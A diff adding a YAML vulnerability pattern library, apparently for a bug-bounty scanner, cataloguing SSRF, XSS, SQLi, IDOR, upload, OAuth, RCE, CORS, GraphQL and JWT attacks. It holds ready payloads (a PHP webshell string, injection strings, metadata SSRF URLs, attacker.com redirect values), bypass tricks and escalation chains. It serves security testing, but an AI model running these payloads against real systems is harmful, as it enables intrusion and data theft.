@@ -1,0 +1,337 @@
+# Vulnerability Pattern Library - curated from disclosed HackerOne reports
+# All string values containing ':' are quoted to prevent YAML parsing issues.
+
+patterns:
+  - id: ssrf
+    title: "Server-Side Request Forgery"
+    capability: web.scan
+    triggers:
+      - '[?&](url|next|redirect|return|callback|forward|proxy|path|dest|target|uri|link|src|source)='
+      - '[?&](webhook|notify_url|callback_url|ping_url|fetch_url)='
+      - '/webhook/[a-zA-Z0-9_-]+'
+    detection:
+      - "Parameter value is or contains a URL"
+      - "Application fetches remote resource and reflects content"
+      - "SSRF-blind: DNS/HTTP callback via Burp Collaborator or interactsh"
+    payloads:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://127.0.0.1:8080/admin"
+      - "http://localhost:6379/ (Redis)"
+      - "gopher://127.0.0.1:6379/_INFO"
+      - "dict://127.0.0.1:11211/ (Memcached)"
+    bypass:
+      - "IPv6: http://[::1]:8080/"
+      - "DNS rebinding: http://1.0.0.127.nip.io/"
+      - "URL scheme abuse: gopher://, dict://, file://"
+      - "Decimal IP: http://2130706433/"
+      - "Octal IP: http://0177.0.0.1/"
+      - "Short-hand IP: http://0/"
+      - "Enclosed alphanumeric: http://..."
+      - "DNS A/AAAA record pointing to internal IP"
+      - "Redirect chain: external URL to 302 to internal"
+      - "CRLF injection in URL"
+      - "Unicode normalization bypass"
+    chain_templates:
+      - "SSRF to cloud metadata to IAM credentials to cloud takeover"
+      - "SSRF to internal service to RCE"
+      - "SSRF to internal API to IDOR/data leak"
+    verification:
+      - "Confirm out-of-band callback from target server"
+      - "Retrieve unique internal data (metadata, internal endpoints)"
+      - "Not just 200 OK - show actual fetched data"
+    false_positives:
+      - "URL is only parsed, never fetched"
+      - "DNS resolution only, no HTTP request"
+      - "SSRF to yourself (same host)"
+
+  - id: xss
+    title: "Cross-Site Scripting"
+    capability: xss.detect
+    triggers:
+      - '[?&](q|search|query|keyword|term|input|text|msg|message|comment|name|email|url|redirect|return)='
+      - '<script[^>]*>'
+      - 'document\.(cookie|location|write)'
+      - 'innerHTML|outerHTML|eval\(|setTimeout\(|setInterval\('
+    detection:
+      - "Input reflected in HTML response without encoding"
+      - "Stored input rendered in page without sanitization"
+      - "DOM-based: user input flows to dangerous sink"
+    payloads:
+      - '<script>alert(document.domain)</script>'
+      - '"><script>alert(1)</script>'
+      - '<img src=x onerror=alert(1)>'
+      - '<svg onload=alert(1)>'
+      - 'javascript:alert(1)'
+      - '{{constructor.constructor("alert(1)")()}}'
+    bypass:
+      - "Case variations: <ScRiPt>"
+      - "Null bytes: <scr%00ipt>"
+      - "HTML entities: &#x3C;script&#x3E;"
+      - "Double encoding: %253Cscript%253E"
+      - "Polyglot payloads"
+      - "Mutation XSS via innerHTML"
+      - "CSP bypass via JSONP endpoints"
+      - "DOM clobbering"
+      - "Prototype pollution to XSS"
+    chain_templates:
+      - "Stored XSS to cookie theft to account takeover"
+      - "DOM XSS to CSP bypass to data exfiltration"
+      - "Reflected XSS to CSRF token grab to state-changing CSRF"
+    false_positives:
+      - "Self-XSS (only affects attackers own browser)"
+      - "Content reflected inside JSON string with proper encoding"
+      - "Response Content-Type is application/json"
+
+  - id: sqli
+    title: "SQL Injection"
+    capability: sql.inject
+    triggers:
+      - '[?&](id|uid|user|user_id|product|item|order|page|cat|category|article|post|file)='
+      - '[?&](sort|order_by|sort_by|dir|direction)='
+      - '/api/v[0-9]+/[a-z]+/[0-9]+'
+    detection:
+      - "Error-based: database error messages in response"
+      - "Boolean-based: different responses for true/false conditions"
+      - "Time-based: SLEEP() or pg_sleep() delays"
+      - "Union-based: UNION SELECT to extract data"
+    payloads:
+      - "' OR '1'='1"
+      - "' OR 1=1--"
+      - "1' UNION SELECT 1,2,3--"
+      - "1 AND SLEEP(5)"
+      - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      - "1 ORDER BY 100--"
+    bypass:
+      - "Comment obfuscation: /**/or/**/1=1"
+      - "Case mixing: UnIoN SeLeCt"
+      - "Whitespace alternatives: tab, newline, /**/"
+      - "URL encoding: %27"
+      - "Double URL encoding: %2527"
+      - "Hex encoding: 0x27204f5220313d31"
+      - "No-Quote injection on numeric parameters"
+    chain_templates:
+      - "SQLi to data extraction to credential dump to ATO"
+      - "SQLi to file read (LOAD_FILE) to source code leak"
+      - "SQLi to INTO OUTFILE to webshell to RCE"
+    false_positives:
+      - "SQL error message but no data extraction possible"
+      - "WAF blocking at network level, never reaching app"
+      - "Parameterized query with safe error handling"
+
+  - id: idor
+    title: "Insecure Direct Object Reference"
+    capability: web.scan
+    triggers:
+      - '/api/(users|accounts|orders|invoices|files|documents|profiles)/[0-9a-f-]+'
+      - '[?&](user_id|uid|account_id|order_id|file_id|doc_id|profile_id)='
+      - '/api/v[0-9]+/[a-z]+/[0-9a-f-]+'
+    detection:
+      - "Change resource ID to another valid value"
+      - "Horizontal: access another users resource"
+      - "Vertical: access admin-level resource"
+    payloads:
+      - "Sequential ID enumeration (1, 2, 3...)"
+      - "UUID guessing from patterns"
+      - "Mass assignment: add role=admin to request body"
+      - "HTTP method swap: POST to GET, GET to POST"
+      - "Array wrap: user_id=[1,2] returns both"
+      - "Wildcard: user_id=*"
+    bypass:
+      - "Try both authenticated and unauthenticated access"
+      - "Use second test account to confirm cross-user access"
+      - "Check different HTTP methods (PUT, PATCH, DELETE)"
+      - "JSON parameter pollution: {user_id:1, user_id:2}"
+      - "GraphQL: query with altered node IDs"
+    chain_templates:
+      - "IDOR to PII leak to GDPR violation report"
+      - "IDOR to privilege escalation to admin takeover"
+      - "IDOR to data modification to financial impact"
+    false_positives:
+      - "Resource ID change returns data thats public anyway"
+      - "403 but different response time (timing alone isnt IDOR)"
+
+  - id: file-upload
+    title: "Unrestricted File Upload"
+    capability: web.scan
+    triggers:
+      - 'multipart/form-data'
+      - '/upload|/import|/avatar|/profile'
+      - 'type="file"'
+    detection:
+      - "Upload allowed file types, then try blocked extensions"
+      - "Check if uploaded file is accessible at a predictable URL"
+      - "Upload server-side script (PHP, JSP, ASPX)"
+    payloads:
+      - "shell.php to shell.php5, shell.phtml, shell.phar"
+      - "Double extension: shell.php.jpg"
+      - "Null byte (legacy): shell.php%00.jpg"
+      - "Magic byte spoof: GIF89a;<?php system($_GET['c']); ?>"
+      - "SVG XSS: <svg onload=alert(1)>"
+      - "XML XXE in DOCX/XLSX"
+    bypass:
+      - "Content-Type manipulation"
+      - "Proxied upload through another service"
+      - "Race condition: upload + access before validation"
+      - "Polyglot files (valid image + valid script)"
+    chain_templates:
+      - "File upload to webshell to RCE to data exfiltration"
+      - "SVG upload to stored XSS to cookie theft"
+      - "Office doc upload to XXE to SSRF"
+    false_positives:
+      - "Upload succeeds but file renamed and served as application/octet-stream"
+      - "Upload accepted but content is sanitized server-side"
+
+  - id: oauth
+    title: "OAuth 2.0 / OIDC Misconfiguration"
+    capability: web.scan
+    triggers:
+      - '/oauth/(authorize|token|callback|redirect)'
+      - '/oidc/'
+      - '/\.well-known/openid-configuration'
+      - '[?&](redirect_uri|callback_url|return_url|state)='
+    detection:
+      - "redirect_uri validation bypass"
+      - "state parameter missing or predictable (CSRF)"
+      - "Implicit grant flow used (access_token in fragment)"
+      - "Open redirector chained with OAuth"
+    payloads:
+      - "redirect_uri=https://attacker.com"
+      - "redirect_uri=https://target.com.attacker.com"
+      - "redirect_uri=https://target.com@attacker.com"
+      - "redirect_uri=https://target.com/../attacker.com"
+      - "redirect_uri=https://target.com%2f@attacker.com"
+    bypass:
+      - "Path traversal in redirect_uri"
+      - "Subdomain registration (target.com.attacker.com)"
+      - "Open redirect on target.com to attacker.com (2-step)"
+      - "Missing state to login CSRF to account linking attack"
+      - "PKCE missing to authorization code interception"
+    chain_templates:
+      - "OAuth redirect_uri bypass to authorization code theft to account takeover"
+      - "Missing PKCE to code interception to session hijacking"
+      - "OAuth + open redirect to chained account takeover"
+    false_positives:
+      - "redirect_uri validated server-side with exact match"
+      - "PKCE enforced and code_challenge verified"
+      - "state parameter correctly validated"
+
+  - id: rce
+    title: "Remote Code Execution"
+    capability: vuln.scan
+    triggers:
+      - '[?&](cmd|exec|command|run|shell|ping|debug|eval)='
+      - '/cgi-bin/'
+      - '/wp-admin/admin-ajax.php?action='
+    detection:
+      - "Command injection in OS-level command parameters"
+      - "Deserialization of user-controlled data"
+      - "Template injection (SSTI) in template parameters"
+      - "File inclusion (LFI to RCE via log poisoning, PHP wrappers)"
+    payloads:
+      - "; id"
+      - "| whoami"
+      - "`id`"
+      - "$(id)"
+      - "&& sleep 5"
+      - "{{7*7}}"
+      - "${7*7}"
+      - "php://filter/convert.base64-encode/resource=index"
+    bypass:
+      - "Newline injection: %0aid"
+      - "Nested command substitution"
+      - "Environment variable expansion"
+      - "Base64-encoded commands"
+      - "IFS-based whitespace bypass"
+      - "Wildcard-based command execution"
+    chain_templates:
+      - "LFI to log poisoning to RCE to reverse shell"
+      - "SSTI to RCE to credential extraction"
+      - "Deserialization to RCE to persistence"
+    false_positives:
+      - "Command output not reflected or observable"
+      - "Sandboxed/containerized execution without breakout path"
+
+  - id: cors
+    title: "CORS Misconfiguration"
+    capability: cors.audit
+    triggers:
+      - 'Access-Control-Allow-Origin'
+      - 'Access-Control-Allow-Credentials: true'
+    detection:
+      - "Origin reflection: Origin header reflected in ACAO"
+      - "Null origin allowed: Origin: null to ACAO: null"
+      - "Credentials + wildcard origin"
+      - "ACAO: * with ACAC: true"
+    payloads:
+      - "Origin: https://attacker.com"
+      - "Origin: null (sandboxed iframe)"
+      - "Origin: https://target.com.attacker.com"
+      - "Origin: https://target.com.evil.com"
+    bypass:
+      - "Subdomain takeover to valid origin on same root domain"
+      - "XSS on subdomain to CORS to parent domain"
+      - "PostMessage + wildcard origin"
+    chain_templates:
+      - "CORS misconfig to CSRF-like data theft to PII leak"
+      - "CORS misconfig + XSS to full account read"
+    false_positives:
+      - "ACAO: * without credentials (safe for public APIs)"
+      - "Origin validated server-side but header reflected by CDN/WAF"
+
+  - id: graphql
+    title: "GraphQL Misconfiguration"
+    capability: web.scan
+    triggers:
+      - '/graphql'
+      - '/v[0-9]+/graphql'
+      - '__schema'
+      - '__type'
+    detection:
+      - "Introspection query enabled"
+      - "Field suggestions in error messages"
+      - "Depth/batching attacks (DoS)"
+      - "node() IDOR via global object identification"
+    payloads:
+      - "{__schema{types{name fields{name type{name}}}}}"
+      - "query{__type(name:\"User\"){fields{name}}}"
+      - "mutation{deleteUser(id:1){id}}"
+      - "query node() based cross-object access"
+    bypass:
+      - "Alias-based batching to bypass rate limits"
+      - "Persisted queries bypass introspection controls"
+      - "Fragment reuse for depth amplification"
+    chain_templates:
+      - "GraphQL introspection to schema leak to targeted IDOR"
+      - "GraphQL batching to brute force to credential enumeration"
+      - "GraphQL node() to cross-object data access"
+    false_positives:
+      - "Introspection disabled but schema already public (documented API)"
+      - "Depth limiting enforced"
+
+  - id: jwt
+    title: "JWT Attacks"
+    capability: api.audit
+    triggers:
+      - 'Authorization: Bearer eyJ'
+      - 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
+    detection:
+      - "Algorithm confusion (RS256 to HS256 with public key)"
+      - "None algorithm (alg: none)"
+      - "Weak HMAC secret (brute-forceable)"
+      - "kid injection (path traversal or SQLi in key ID)"
+    payloads:
+      - '{"alg":"none","typ":"JWT"}'
+      - '{"alg":"HS256","typ":"JWT"} (with public key)'
+      - '{"kid":"../../../../etc/passwd"}'
+      - "kid injection via SQLi"
+    bypass:
+      - "jku (JWK Set URL) header to attacker-controlled keys"
+      - "x5u (X.509 URL) to attacker certificate"
+      - "Empty signature"
+    chain_templates:
+      - "JWT algorithm confusion to privilege escalation to admin access"
+      - "JWT kid injection to LFI to source code leak"
+      - "JWT weak secret to brute force to account takeover"
+    false_positives:
+      - "Algorithm restricted to RS256 and key well-protected"
+      - "kid validated against allowlist"
